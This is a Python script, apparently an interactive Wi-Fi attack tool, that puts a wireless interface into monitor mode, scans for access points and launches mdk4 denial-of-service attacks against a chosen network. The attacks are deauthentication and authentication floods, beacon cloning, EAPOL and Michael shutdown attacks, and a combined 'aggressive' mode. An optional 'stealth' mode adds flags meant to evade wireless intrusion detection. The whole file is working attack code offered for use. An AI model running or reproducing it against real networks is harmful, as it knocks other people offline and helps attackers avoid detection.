import os
import subprocess
import sys
import time
import shutil
import re
import csv
import signal

def bootstrap_dependencies():
    try:
        import rich
        import pyfiglet
    except ImportError:
        try:
            subprocess.check_call([
                sys.executable, "-m", "pip", "install",
                "rich", "pyfiglet", "--break-system-packages"
            ])
            os.execv(sys.executable, ['python3'] + sys.argv)
        except Exception:
            sys.exit(1)

bootstrap_dependencies()

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.live import Live
from rich.prompt import Prompt, Confirm
from rich import box
from rich.markup import escape
import pyfiglet

console = Console()
OPERATION_MODE = 0 # 0: Legacy, 1: Stealth

def clear_screen():
    subprocess.run(["clear"] if os.name == "posix" else ["cls"])

def get_gradient_banner(text_content):
    ascii_art = pyfiglet.figlet_format(text_content, font="slant")
    lines = ascii_art.splitlines()
    styled_text = Text()
    for i, line in enumerate(lines):
        color = f"rgb({max(100, 255-i*20)},{min(50+i*30, 255)},255)"
        styled_text.append(line + "\n", style=color)
    return styled_text

def cyber_print(message, style="bold cyan"):
    left_bracket = r"[bold white]\[[/bold white]"
    right_bracket = r"[bold white]\][/bold white]"
    content = f"[{style}]{escape(message)}[/{style}]"
    console.print(f"{left_bracket}{content}{right_bracket}")

def check_dependencies():
    deps = ["mdk4", "iw", "airmon-ng", "airodump-ng", "nmcli"]
    with console.status("[bold magenta]Checking System Integrity...", spinner="bouncingBall"):
        for dep in deps:
            if shutil.which(dep) is None:
                console.print(Panel(f"CRITICAL ERROR: '{dep}' NOT FOUND", title="SYSTEM FAILURE", border_style="red"))
                sys.exit(1)
        time.sleep(0.4)

def get_detailed_interfaces():
    interfaces = []
    try:
        output = subprocess.check_output(["iw", "dev"], text=True)
        ifnames = re.findall(r"Interface\s+(.+)", output)
        for dev in ifnames:
            dev = dev.strip()
            try:
                vendor_info = subprocess.check_output(
                    ["nmcli", "-t", "-f", "GENERAL.VENDOR,GENERAL.PRODUCT", "device", "show", dev],
                    text=True, stderr=subprocess.DEVNULL
                ).replace("\n", " ").strip() or "GENERIC DEVICE"
            except:
                vendor_info = "GENERIC DEVICE"
            try:
                phy_output = subprocess.check_output(["iw", "dev", dev, "info"], text=True)
                phy_match = re.search(r"wiphy\s+(\d+)", phy_output)
                phy_idx = phy_match.group(1) if phy_match else None
            except:
                phy_idx = None
            bands = []
            if phy_idx:
                try:
                    phy_info = subprocess.check_output(["iw", "phy", f"phy{phy_idx}", "info"], text=True)
                    if any(x in phy_info for x in ["2412 MHz", "Band 1"]): bands.append("2.4G")
                    if any(x in phy_info for x in ["5180 MHz", "Band 2"]): bands.append("5G")
                    if any(x in phy_info for x in ["5955 MHz", "Band 3"]): bands.append("6G")
                except: pass
            interfaces.append({"name": dev, "vendor": vendor_info, "bands": bands})
    except Exception as e:
        console.print(f"[red]FAILED TO DETECT INTERFACES: {e}")
    return interfaces

def select_operation_mode():
    global OPERATION_MODE
    while True:
        clear_screen()
        console.print(get_gradient_banner("Operation Mode"))
        table = Table(show_header=True, header_style="bold magenta", expand=True, box=box.DOUBLE_EDGE)
        table.add_column("ID", style="dim", width=4, justify="center")
        table.add_column("Attack Mode", style="bold cyan")
        table.add_column("Profile", style="white")
        table.add_row("1", "LEGACY", "Standard mdk4 packet injection (High Speed)\n")
        table.add_row("2", "STEALTH", "IDS Evasion (Fragmentation & Ghosting)\n[bold green]Safe for WIDS/WIPS[/bold green]\n")
        table.add_row("Q", "EXIT", "Close Application")
        console.print(Panel(table, title="[bold white]STEP 1: SELECT OPERATION MODE[/bold white]", border_style="bright_blue", padding=(1,2)))
        choice = Prompt.ask("[bold yellow]SELECT[/bold yellow]", choices=["1", "2", "q", "Q"])
        if choice.lower() == 'q':
            if Confirm.ask("[bold red]Exit application?[/bold red]"): sys.exit(0)
            else: continue
        OPERATION_MODE = 0 if choice == '1' else 1
        return True

def select_band_mode(interface, caps):
    while True:
        clear_screen()
        console.print(get_gradient_banner("FREQ-SET"))
        options = []
        if "2.4G" in caps: options.append(("2.4 GHz ONLY", "bg"))
        if "5G" in caps: options.append(("5.0 GHz ONLY", "a"))
        if "6G" in caps: options.append(("6.0 GHz ONLY", "6"))
        if len(caps) > 1:
            mix_label = " & ".join([f"{b}Hz" for b in caps])
            mix_code = "".join(["bg" if b=="2.4G" else "a" if b=="5G" else "6" for b in caps])
            options.append((f"MIXED MODE ({mix_label})", mix_code))
        if not options: options.append(("2.4 GHz (Default)", "bg"))
        table = Table(title=f"DEVICE CAPABILITIES: {interface}", border_style="magenta", box=box.HORIZONTALS)
        table.add_column("CODE", justify="center", style="bold yellow")
        table.add_column("FREQUENCY SPECTRUM")
        for i, (label, _) in enumerate(options, 1):
            table.add_row(str(i), label)
        table.add_row("0", "BACK TO INTERFACE SELECTION")
        console.print(Panel(table, title="[bold white]STEP 3: SELECT FREQUENCY BAND[/bold white]", border_style="bright_blue"))
        choice = Prompt.ask("[bold yellow]CHOOSE BAND[/bold yellow]")
        if choice == "0": return "BACK"
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(options): return options[idx][1]
        except: pass
        console.print("[red][!] INVALID CHOICE.")
        time.sleep(1)

def scan_targets(interface, band_mode):
    temp_file = "/tmp/scan_result"
    for f in os.listdir("/tmp"):
        if f.startswith("scan_result"):
            try: os.remove(os.path.join("/tmp", f))
            except: pass
    console.print(f"\n[bold yellow]»[/bold yellow] Scanning Targets on [bold cyan]{interface}[/bold cyan]...")
    console.print("[dim]Press Ctrl+C once targets appear.[/dim]\n")
    time.sleep(1)
    cmd = ["sudo", "airodump-ng", interface, "--band", band_mode, "--write", temp_file, "--output-format", "csv"]
    try: subprocess.run(cmd)
    except KeyboardInterrupt: console.print("\n[bold green]»[/bold green] Scan Complete.")
    targets = []
    csv_file = f"{temp_file}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f)
            start_reading = False
            for row in reader:
                if not row or len(row) < 14: continue
                if "BSSID" in row[0]: start_reading = True; continue
                if "Station" in row[0]: break
                if start_reading:
                    bssid, ssid = row[0].strip(), row[13].strip()
                    if bssid and bssid != "BSSID":
                        targets.append({"bssid": bssid, "ssid": ssid or "<HIDDEN>", "ch": row[3].strip(), "enc": row[5].strip()})
    if not targets:
        console.print(Panel("No Networks Found", style="bold red")); time.sleep(1.5)
        return None, None, None, None
    clear_screen()
    console.print(get_gradient_banner("LOCK-ON"))
    table = Table(expand=True, border_style="bright_yellow", box=box.ROUNDED)
    table.add_column("ID", justify="center"); table.add_column("CH", style="cyan"); table.add_column("ENC", style="green"); table.add_column("BSSID (MAC)"); table.add_column("SSID")
    for i, target in enumerate(targets, 1):
        table.add_row(str(i), target['ch'], target['enc'], target['bssid'], target['ssid'])
    console.print(table); console.print(f"[bold cyan]0[/bold cyan]. Cancel & Back")
    choice = Prompt.ask("\nSelect Target ID")
    if choice == "0": return None, None, None, None
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(targets):
            t = targets[idx]
            return t['bssid'], t['ssid'], t['ch'], t['enc']
    except: pass
    return None, None, None, None

def restore_network(interface):
    clear_screen()
    with console.status("[bold green]Restoring Network Settings...", spinner="aesthetic"):
        subprocess.run(["sudo", "pkill", "mdk4"], capture_output=True)
        subprocess.run(["sudo", "pkill", "airodump-ng"], capture_output=True)
        subprocess.run(["sudo", "airmon-ng", "stop", interface], capture_output=True)
        base_iface = interface.replace('mon', '')
        subprocess.run(["sudo", "ip", "link", "set", base_iface, "up"], capture_output=True)
        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], capture_output=True)
        subprocess.run(["sudo", "rfkill", "unblock", "wifi"], capture_output=True)
    console.print(Panel("Network Restored.", border_style="green")); time.sleep(1.5)

def run_attack(commands):
    if not any(isinstance(i, list) for i in commands):
        commands = [commands]

    processes = []
    evasion = ["--ghost", "50,54,10", "--frag", "2,8,50"]

    try:
        for cmd in commands:
            final_cmd = cmd
            if OPERATION_MODE == 1:
                final_cmd = cmd[:3] + evasion + cmd[3:]

            display_cmd = " ".join(final_cmd)
            console.print(f"[bold red]LAUNCHING:[/bold red] [dim]{display_cmd}[/dim]")

            p = subprocess.Popen(final_cmd, preexec_fn=os.setsid)
            processes.append(p)

        cyber_print("Attack Active! Press Ctrl+C to stop.", "bold yellow")

        for p in processes:
            p.wait()

    except KeyboardInterrupt:
        console.print("\n[bold red][!] Interrupted. Killing all processes...[/bold red]")
        for p in processes:
            try:
                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            except: pass
        subprocess.run(["sudo", "pkill", "mdk4"], capture_output=True)
        time.sleep(1)

def main_menu():
    check_dependencies()
    while True:
        select_operation_mode()
        while True:
            clear_screen()
            console.print(get_gradient_banner("Interfaces"))
            interfaces = get_detailed_interfaces()
            table = Table(expand=True, border_style="blue", box=box.SIMPLE_HEAVY)
            table.add_column("ID", justify="center"); table.add_column("INTERFACE"); table.add_column("VENDOR"); table.add_column("FQ")
            for i, iface in enumerate(interfaces, 1):
                table.add_row(
    f"[bold yellow]{i}[/bold yellow]",
    f"[bold yellow]{iface['name']}[/bold yellow]",
    f"[bold yellow]{iface['vendor']}[/bold yellow]",
    f"[bold yellow]{', '.join(iface['bands']) or 'N/A'}[/bold yellow]"
)
            table.add_row("0", "[bold white]Back to Mode Menu", "", "")
            console.print(Panel(table, title="[bold white]STEP 2: SELECT HARDWARE INTERFACE[/bold white]", border_style="bright_blue"))

            choice = Prompt.ask("\nSelect Interface Number")
            if choice == "0": break
            try:
                selected_data = interfaces[int(choice)-1]
                target_iface = selected_data['name']
                session_band = select_band_mode(target_iface, selected_data['bands'])
                if session_band == "BACK": continue

                with console.status(f"[bold cyan]Enabling Monitor Mode...", spinner="shark"):
                    subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)
                    subprocess.run(["sudo", "airmon-ng", "start", target_iface], capture_output=True)
                    time.sleep(1)

                result = subprocess.run(["ip", "-br", "link", "show"], capture_output=True, text=True)
                actual_iface = target_iface + "mon" if target_iface + "mon" in result.stdout else target_iface

                cyber_print(f"Monitor Mode Active: {actual_iface}", "bold green"); time.sleep(1)
                target_mac, target_ssid, target_ch, target_enc = None, None, None, None
                mode_txt = "STEALTH" if OPERATION_MODE == 1 else "LEGACY"

                while True:
                    clear_screen()
                    console.print(get_gradient_banner("WiFi-STRESS"))
                    status_table = Table.grid(expand=True)
                    status_table.add_row("Mode", f": [bold yellow]{mode_txt}[/bold yellow]")
                    status_table.add_row("Interface", f": [bold white]{actual_iface}[/bold white]")
                    status_table.add_row("Target", f": [bold green]{target_ssid or 'NOT SELECTED'}[/bold green]")
                    status_table.add_row("BSSID", f": {target_mac or '-'}")
                    status_table.add_row("Channel", f": {target_ch or '-'}")
                    console.print(Panel(status_table, title="System Status", border_style="cyan"))

                    menu = Table(show_header=False, expand=True, box=None)
                    if not target_mac:
                        menu.add_row("[bold yellow]1. Scan Target")
                        menu.add_row("[bold yellow]2. Change Interface")
                        menu.add_row("[bold yellow]3. Exit & Restore")
                    else:
                        menu.add_row("1. Rescan Targets", "7. SSID Brute Force")
                        menu.add_row("2. Auth Stress", "8. WIDS Confusion")
                        menu.add_row("3. Manual Beacon", "9. WPA EAPOL DoS")
                        menu.add_row("4. Beacon Clone", "10. Michael Shutdown")
                        menu.add_row("5. Deauth Flood", "[bold green]11. Restore Network")
                        menu.add_row("[bold red]6. Aggressive Combo", "[bold cyan]12. Exit")

                    console.print(Panel(menu, title="Actions", border_style="white"))
                    act = Prompt.ask("Action")

                    if not target_mac:
                        if act == '1':
                            m, s, c, e = scan_targets(actual_iface, session_band)
                            if m: target_mac, target_ssid, target_ch, target_enc = m, s, c, e
                        elif act == '2': restore_network(actual_iface); break
                        elif act == '3': restore_network(actual_iface); sys.exit(0)
                        continue

                    if act == '1':
                        m, s, c, e = scan_targets(actual_iface, session_band)
                        if m: target_mac, target_ssid, target_ch, target_enc = m, s, c, e
                    elif act == '11': restore_network(actual_iface); break
                    elif act == '12': restore_network(actual_iface); sys.exit(0)
                    elif target_mac:
                        subprocess.run(["sudo", "iw", "dev", actual_iface, "set", "channel", target_ch])
                        base_cmd = ["sudo", "mdk4", actual_iface]

                        if act == '2': run_attack(base_cmd + ["a", "-a", target_mac, "-s", "500"])
                        elif act == '3':
                            name = Prompt.ask("Enter Fake SSID Name")
                            run_attack(base_cmd + ["b", "-n", name, "-m", "-s", "200"])
                        elif act == '4': run_attack(base_cmd + ["b", "-a", target_mac, "-m", "-s", "200"])
                        elif act == '5': run_attack(base_cmd + ["d", "-B", target_mac])

                        elif act == '6':
                            console.print("[bold red]RUNNING AGGRESSIVE COMBO (PARALEL)...[/bold red]")
                            cmd_deauth = base_cmd + ["d", "-B", target_mac]
                            cmd_auth = base_cmd + ["a", "-a", target_mac, "-s", "500"]
                            run_attack([cmd_deauth, cmd_auth])
                        # ----------------------------------------

                        elif act == '7': run_attack(base_cmd + ["p", "-t", target_mac, "-b", "nul"])
                        elif act == '8': run_attack(base_cmd + ["w", "-e", target_ssid, "-z"])
                        elif act == '9': run_attack(base_cmd + ["e", "-t", target_mac])
                        elif act == '10': run_attack(base_cmd + ["m", "-t", target_mac])

            except (ValueError, IndexError):
                console.print("[red][!] Error selection."); time.sleep(1)

if __name__ == "__main__":
    if os.geteuid() != 0:
        console.print(Panel("ERROR: MUST BE RUN AS ROOT", style="bold red")); sys.exit(1)
    try: main_menu()
    except KeyboardInterrupt:
        subprocess.run(["sudo", "pkill", "mdk4"], capture_output=True); sys.exit(0)
